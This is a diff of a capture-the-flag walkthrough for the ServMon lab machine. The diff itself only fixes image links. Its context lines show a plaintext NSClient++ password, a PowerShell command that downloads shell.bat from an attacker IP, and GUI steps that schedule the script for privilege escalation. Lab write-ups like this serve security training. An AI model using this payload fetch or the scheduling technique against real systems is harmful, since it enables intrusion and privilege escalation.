@@ -100,7 +100,7 @@ Current password: ew2x6SsGTxjRwXOT
 ```
 
 If I try to log in from https://10.10.10.184:8443, it blocks me:
-![[Pasted image 20240913040259.png]]
+![](images/Pasted%20image%2020240913040259.png)
 
 Towards the top of nsclient.ini, there’s this:
 ```
@@ -126,7 +126,7 @@ nadine@SERVMON C:\ProgramData>powershell wget http://10.10.14.65/shell.bat -outf
 ```
 
 3.In the NSClient++ GUI, first I’ll associate my script with a command by clicking Settings > external scripts > scripts, and then “+Add new”.
-![[Pasted image 20240913042430.png]]
+![](images/Pasted%20image%2020240913042430.png)
 When I hit “Add”, df now shows up under scripts above, and the Changes tab turns red. I can go to Changes and save this to the disk config. This will add the following to the config file:
 ```
  ; in flight - TODO
@@ -138,14 +138,14 @@ When I hit “Add”, df now shows up under scripts above, and the Changes tab t
 
 Now under scheduler > schedules I’ll hit the “+Add new” button. I need to add two things here. First, I’ll edit the section to add a new name, and then give it an interval of 10 seconds:
 
-![[Pasted image 20240913042509.png]]
+![](images/Pasted%20image%2020240913042509.png)
 
 After hitting Add, I’ll change edit the form, and then Add again:
 
-![[Pasted image 20240913042519.png]]
+![](images/Pasted%20image%2020240913042519.png)
 
 Now df shows up as a scheduled task, and I can see it has both key/values:
-![[Pasted image 20240913042533.png]]
+![](images/Pasted%20image%2020240913042533.png)
 
 
 Go to Control –> Reload. Then Wait. It can take longer than it feels like it should. This box can be very frustrating.
